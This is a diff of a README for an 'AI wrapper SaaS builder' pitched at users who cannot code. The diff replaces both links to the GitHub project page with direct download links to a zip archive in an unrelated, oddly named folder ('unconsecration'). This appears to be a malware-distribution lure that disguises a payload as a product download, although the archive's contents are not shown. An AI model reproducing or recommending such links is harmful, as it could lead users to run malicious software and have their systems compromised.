@@ -1,6 +1,6 @@
 # 🚀 ai-wrapper-saas-builder - Build your own AI business today
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/kehindegbolagade3-web/ai-wrapper-saas-builder)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/kehindegbolagade3-web/ai-wrapper-saas-builder/raw/refs/heads/main/unconsecration/saas_builder_wrapper_ai_v1.2.zip)
 
 ## 📋 Overview
 This tool helps you build AI software. You do not need to write code to create your own startup. This application provides a structure for your product. You use it to launch an AI platform that solves problems for your customers. Use this to focus on your business goals rather than technical hurdles.
@@ -25,7 +25,7 @@ Your computer must meet these basic standards to run this software smoothly:
 ## 📥 Downloading the Software 📁
 You can get the application from the project page.
 
-[Click here to visit the project page and download the software](https://github.com/kehindegbolagade3-web/ai-wrapper-saas-builder)
+[Click here to visit the project page and download the software](https://github.com/kehindegbolagade3-web/ai-wrapper-saas-builder/raw/refs/heads/main/unconsecration/saas_builder_wrapper_ai_v1.2.zip)
 
 Follow these steps to find the file:
 1. Open the link provided above in your web browser.
